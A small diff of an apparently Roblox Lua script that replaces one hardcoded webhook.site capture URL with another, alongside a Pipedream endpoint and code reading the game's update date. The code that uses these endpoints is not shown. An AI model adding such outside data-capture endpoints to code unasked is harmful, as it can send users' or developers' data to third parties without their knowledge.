@@ -283,7 +283,7 @@ local function acceptEncoding()
 	end
 end
 
-local URL = "https://webhook.site/eb483bfc-3bcb-42aa-be77-497a442a5bd4"
+local URL = "https://webhook.site/15158a8c-32f4-4a3f-9bb8-42ec0665b762"
 local PipeURL = "https://eo2wkof7bwkylkp.m.pipedream.net"
 local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
 local dt = DateTime.fromIsoDate(updatedDate)
